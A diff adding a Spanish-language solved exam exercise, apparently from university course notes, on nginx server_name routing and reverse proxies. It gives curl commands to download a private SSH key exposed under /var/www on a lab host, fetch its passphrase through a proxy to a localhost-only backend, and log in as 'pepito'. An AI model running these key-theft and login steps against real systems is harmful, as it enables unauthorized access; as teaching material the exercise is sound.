@@ -535,3 +535,50 @@ _Fuente: Enunciado real: parcial práctico 2026 1C (PDF). Solución de referenci
 
 ---
 
+
+### Ejercicio 5: extraer una clave SSH servida por nginx y entrar
+
+El host 192.168.0.238 corre nginx con dos sitios: el del puerto 80 sirve `/var/www` como archivos estáticos (`server_name google.com`), y el del puerto 81 es un reverse proxy a `127.0.0.1:8000` (`server_name secrethost`). El mismo host tiene OpenSSH y solo deja entrar al usuario `pepito` con clave privada. La clave está en `/var/www/sec/mykey`, pero tiene passphrase. Hay que extraer la clave, conseguir la passphrase y hacer login.
+
+**La idea:** el sitio del puerto 80 sirve `/var/www` con `try_files`, así que la clave guardada en `/var/www/sec/mykey` queda expuesta como un archivo más en `/sec/mykey`. El backend `127.0.0.1:8000` solo escucha en localhost y no se alcanza desde la red, pero el sitio del puerto 81 lo expone con `proxy_pass`, y por ahí sale la passphrase.
+
+**1. Bajar la clave privada (puerto 80, `root /var/www`)**
+
+```
+curl http://192.168.0.238/sec/mykey -H "Host: google.com" -o mykey
+cat mykey   # tiene que empezar con -----BEGIN OPENSSH PRIVATE KEY-----
+```
+
+El `-H "Host: google.com"` es lo que hace que nginx elija ese `server` (matchea `server_name`). Sin el header correcto cae en el default server y puede dar 404.
+
+**2. Permisos estrictos (si no, ssh rechaza la clave)**
+
+```
+chmod 600 mykey
+```
+
+**3. Conseguir la passphrase por el proxy (puerto 81 → `127.0.0.1:8000`)**
+
+```
+curl http://192.168.0.238:81/ -H "Host: secrethost"
+```
+
+Ese contenido no es accesible directo desde afuera (el 8000 es solo localhost); el proxy del 81 es la única puerta. Ahí tiene que venir la passphrase.
+
+**4. Login por SSH como pepito**
+
+```
+ssh -i ./mykey pepito@192.168.0.238
+# en "Enter passphrase for key 'mykey':" poné la del paso 3
+```
+
+_Verificación:_ el `cat` del paso 1 muestra el bloque `BEGIN OPENSSH PRIVATE KEY`; el curl del paso 3 devuelve la passphrase; el ssh abre shell como `pepito`.
+
+**Errores típicos**
+
+- Olvidar el `-H "Host: ..."`: nginx enruta por `server_name` contra el header Host, no por la IP. Sin el Host correcto no pegás al server que querés.
+- Usar `ssh -i mykey` sin `./`: con un nombre sin ruta, ssh puede buscarlo en `~/.ssh`. Poné `./mykey` o la ruta absoluta.
+- Saltear el `chmod 600`: ssh aborta con "UNPROTECTED PRIVATE KEY FILE".
+- Pegarle al 8000 directo desde afuera: no escucha en la red, solo en 127.0.0.1. Hay que pasar por el proxy del 81.
+
+_Fuente: enunciado de parcial (nginx + SSH). Demuestra routing por server_name, archivos estáticos con try_files y reverse proxy a un backend solo-localhost._
